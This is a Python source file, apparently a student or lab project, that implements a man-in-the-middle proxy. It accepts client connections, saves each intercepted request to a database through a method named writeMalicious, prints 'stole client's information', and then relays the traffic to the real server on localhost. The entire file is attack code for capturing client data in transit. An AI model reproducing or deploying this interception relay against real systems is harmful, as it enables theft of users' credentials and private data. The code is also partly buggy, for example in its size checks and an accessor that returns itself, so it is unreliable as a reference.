import socket
import sys
import getpass
import select
from Requests import *
from Database import *
from Server import *
from errHandle import *

ADDRESS_OF_SERVER = '127.0.0.1'


class MiddleMan:

    def __init__(self,TCP_IP,BUFFER_SIZE):
        self.TCP_IP = TCP_IP
        self.TCP_ASCLIENT_PORT = int(sys.argv[2])
        self.TCP_ASSERVER_PORT = int(sys.argv[1])
        self.BUFFER_SIZE = BUFFER_SIZE
        self.db = Database()
        self.e = errHandle()

        #setting up middleman acting as a server, listening to the client's requests
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            print("socketasserver created successfully")
            self.socketasserver = s
        except socket.error as msg:
            s = None
            self.socketasserver = None
            print("could not create socket %s"%(msg))

        try:
            s.bind((self.TCP_IP, self.TCP_ASSERVER_PORT))
            self.socketasserver.listen(1)
            #self.append(self)

        except socket.error as msg:
            s.close()
            s = None
            self.socketasserver = None
            print("could not bind or listen %s"%(msg))
        #setting up middleman acting as a client, sending requests back to legit server
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Socketas client created successfully")
            self.socketasclient = c
        except socket.error as msg:
            print("Error creating socket: %s" %msg)
            sys.exit(1)
        try:
            c.connect((self.TCP_IP, self.TCP_ASCLIENT_PORT))
            print("Socket connection valid")
        except socket.error as msg:
            print("Connection Error %s" %msg)
            sys.exit(1)

    def sendAllasServer(self,reqstr,connection,buffsize):
        connection.send((len(reqstr)).to_bytes(4,'little'))
        connection.send(reqstr)

    def recieveAllasServer(self,connection,buffsize):
        retdata = ""
        cry = Crypt()
        data = bytearray()
        packetsize = connection.recv(4)
        print(sys.getsizeof(data), int.from_bytes(packetsize,'little'))
        while sys.getsizeof(data) < int.from_bytes(packetsize,'little'):
            data.extend(connection.recv(self.getBUFFER_SIZE()))
        return data

    def sendAllasClient(self,reqstr,buffsize):
        self.getSocketasClient().sendto((len(reqstr)).to_bytes(4,'little'),(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
        self.getSocketasClient().sendto(reqstr,(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))

    def recieveAllasClient(self,buffsize):
        retdata = ""
        cry = Crypt()
        data = bytearray()
        packetsize = self.getSocketasClient().recv(4)
        print(sys.getsizeof(data), int.from_bytes(packetsize,'little'))
        while sys.getsizeof(data) < int.from_bytes(packetsize,'little'):
            data.extend(self.getSocketasClient().recv(self.getBUFFER_SIZE()))
        return data

    def getTCP_IP(self):
        return self.TCP_IP

    def getTCP_ASCLIENT_PORT(self):
        return self.TCP_ASCLIENT_PORT

    def getTCP_ASSERVER_PORT(self):
        return self.TCP_ASSERVER_PORT

    def getBUFFER_SIZE(self):
        return self.BUFFER_SIZE

    def getserveradd(self):
        return self.getserveradd

    def getSocketasClient(self):
        return self.socketasclient

    def getSocketasServer(self):
        return self.socketasserver

    def run(self):
        print("waiting...")
        connected_clients = []
        while True:
            attempts_to_connect, wlist, xlist = select.select([self.getSocketasServer()],[], [], 0.05)

            for connections in attempts_to_connect:
                conn, addr = self.getSocketasServer().accept()
                connected_clients.append(conn)
                print('Connection address:', addr)

            clients_allowed = []
            try:
                clients_allowed, wlist, xlist = select.select(connected_clients,[], [], 0.05)
            except select.error:
                pass

            else:
                for conn in clients_allowed:
                    data = self.recieveAllasServer(conn, self.getBUFFER_SIZE())
                    print(data)
                    if data:
                        print("Recieved request from 'client' haha")
                        error = self.db.writeMalicious(data)
                        ret = self.e.send_err(error)
                        if error == 0:
                            print("stole client's information")
                            self.sendAllasClient(data, self.getBUFFER_SIZE())
                            print("Request sent to legit server")
                            data = self.recieveAllasClient(self.getBUFFER_SIZE())
                            print("Got response from server")
                            self.sendAllasServer(data, conn, self.getBUFFER_SIZE())
                            print("Sent server data to client")

                    else:
                        print(conn.getsockname(), "disconnected")
                        connected_clients.remove(conn)

if __name__ == "__main__":
    m = MiddleMan(ADDRESS_OF_SERVER,1024)
    m.run()
